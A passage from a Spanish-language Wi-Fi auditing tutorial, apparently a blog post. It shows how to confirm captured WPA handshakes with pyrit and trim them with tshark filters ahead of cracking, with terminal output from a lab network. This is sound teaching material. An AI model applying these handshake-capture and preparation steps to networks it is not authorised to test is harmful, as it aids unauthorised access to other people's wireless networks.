esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al
AP. Se podría hacer de montón de maneras distintas.&lt;/p&gt;

&lt;p&gt;Lo importante de todo esto es, que el Handshake, no tiene por qué generarse en base a la reautenticación del
cliente a la red pero sólo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda
relación alguna con el ataque de de-autenticación para forzar al cliente a que se reconecte a la red.&lt;/p&gt;

&lt;p&gt;Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por
nuestros medios activos o sin hacer nada a voluntad de la calidad de la señal entre la estación y el AP, o por
el propio cliente que se ha vuelto a reconectar por ‘X’ razones.&lt;/p&gt;

&lt;h3 id=&quot;validación-del-handshake-con-pyrit&quot;&gt;Validación del Handshake con Pyrit&lt;/h3&gt;

&lt;p&gt;Hasta ahora hemos visto técnicas para capturar un Handshake. Ahora bien, en ocasiones, puede suceder que la
suite de aircrack-ng nos diga que ha capturado un Handshake cuando realmente no es así, no sería la primera
vez que me ha llegado a suceder.&lt;/p&gt;

&lt;p&gt;¿Qué mejor que validar la captura con otra herramienta?, con &lt;strong&gt;pyrit&lt;/strong&gt;. Pyrit es una herramienta bestial para
el cracking, análisis de capturas y monitorizado de redes inalámbricas. Uno de los modos de los que dispone,
es de una especie de ‘&lt;strong&gt;checker&lt;/strong&gt;’, con el cual podemos analizar la captura para ver si esta cuenta con un
&lt;strong&gt;Handshake&lt;/strong&gt; o no.&lt;/p&gt;

&lt;p&gt;Por ejemplo, imaginemos que hemos capturado un supuesto Handshake de una red inalámbrica, o al menos eso vemos
desde &lt;strong&gt;aircrack-ng&lt;/strong&gt;. Si quisiéramos ahora validarlo desde &lt;strong&gt;Pyrit&lt;/strong&gt;, haríamos lo siguiente sobre la captura
‘.cap’:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r Captura-01.cap analyze&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-01.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 2 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):&lt;/span&gt;
No valid EAOPL-handshake + ESSID detected.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos, ‘&lt;strong&gt;No valid EAOPL-handshake + ESSID detected.&lt;/strong&gt;’, por lo que la captura no cuenta con ningún
Handshake.&lt;/p&gt;

&lt;p&gt;Veamos ahora un caso donde sí nos reporta que la captura cuenta con un Handshake válido:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r Captura-02.cap analyze&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-02.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 63 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;63 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#1: Station 34:41:5d:46:d1:38, 1 handshake(s):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#1: HMAC_SHA1_AES, good*, spread 1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tal y como se puede observar, la red &lt;strong&gt;hacklab&lt;/strong&gt; cuenta con un Handshake generado por parte de la estación
&lt;strong&gt;34:41:5d:46:d1:38&lt;/strong&gt;, lo cual incluso nos viene de maravilla, porque así tenemos una traza de todo lo
referente a dicha captura, incluido el nombre de la red inalámbrica en caso de que el nombre de nuestra
captura no identifique al AP.&lt;/p&gt;

&lt;h3 id=&quot;tratamiento-y-filtro-de-la-captura&quot;&gt;Tratamiento y filtro de la captura&lt;/h3&gt;

&lt;p&gt;Cabe decir que a la hora de capturar un Handshake, capturamos tal vez más de lo que necesitamos durante el
tiempo de espera. La captura final, puede ser tratada para extraer simplemente la información más relevante
del AP, que sería el &lt;strong&gt;eapol&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Con la herramienta &lt;strong&gt;tshark&lt;/strong&gt;, podemos generar una nueva captura filtrando únicamente los paquetes que nos
interesa de la captura previamente realizada:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;eapol&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 1 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 2 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 3 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 4 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;eapol&quot; 2&amp;gt;/dev/null -w filteredCapture&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r filteredCapture analyze&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'filteredCapture'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 4 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#1: AccessPoint 20:34:fb:b1:c5:53 ('None'):&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#1: Station 34:41:5d:46:d1:38, 1 handshake(s):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#1: HMAC_SHA1_AES, good, spread 1&lt;/span&gt;
No valid EAOPL-handshake + ESSID detected.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y como vemos, nos sigue notificando de que hay 1 Handshake válido por parte de la estación especificada. Sin
embargo, vemos que ahora en el campo ‘ESSID’ de la red nos pone &lt;strong&gt;None&lt;/strong&gt;. Esto es así dado que el campo
&lt;strong&gt;eapol&lt;/strong&gt; no guarda ese tipo de información.&lt;/p&gt;

&lt;p&gt;Ahora es cuando recapitulamos, ¿qué tipo de paquete es el que
guarda esa información?… exacto, los paquetes &lt;strong&gt;Beacon&lt;/strong&gt;, por tanto podemos ajustar un poco más nuestro
filtro para seguir desechando paquetes no necesarios pero filtrando algo más de información en lo referente a
nuestro AP víctima, haciendo uso para ello del operador &lt;strong&gt;OR&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || eapol&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1893, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 1 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 2 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 3 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 4 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este caso, vemos que ha habido un paquete Beacon capturado, indicando el nombre del ESSID al final de la
primera línea.&lt;/p&gt;

&lt;p&gt;Si exportamos dicha captura y analizamos ahora desde &lt;strong&gt;Pyrit&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || eapol&quot; 2&amp;gt;/dev/null -w filteredCapture&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r filteredCapture analyze&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'filteredCapture'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 5 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;#1: Station 34:41:5d:46:d1:38, 1 handshake(s):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#1: HMAC_SHA1_AES, good, spread 1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El campo &lt;strong&gt;‘None’&lt;/strong&gt; es sustituido por el &lt;strong&gt;ESSID&lt;/strong&gt; de la red.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ANOTACIÓN&lt;/strong&gt;: En mi opinión, recomiendo hacer uso del siguiente filtrado para este tipo de casos, donde
además de los paquetes &lt;strong&gt;Beacon&lt;/strong&gt; es preferible filtrar también por los paquetes &lt;strong&gt;Probe Response&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1893, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2287, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1935, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 1 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 2 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 3 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 4 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Otra buena práctica y consejo es acostumbrarnos a hacer estas filtraciones indicando el BSSID de la red
objetivo, así evitamos confusiones y estar filtrando paquetes que no corresponden.&lt;/p&gt;

&lt;p&gt;Para este caso, como sabemos que la dirección MAC del AP es &lt;strong&gt;20:34:fb:b1:c5:53&lt;/strong&gt; (lo podemos ver desde
Pyrit), una buena práctica sería hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;amp;&amp;amp; wlan.addr==20:34:fb:b1:c5:53&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1   0.000000 XiaomiCo_b1:c5:53 → Broadcast    802.11 239 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1893, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
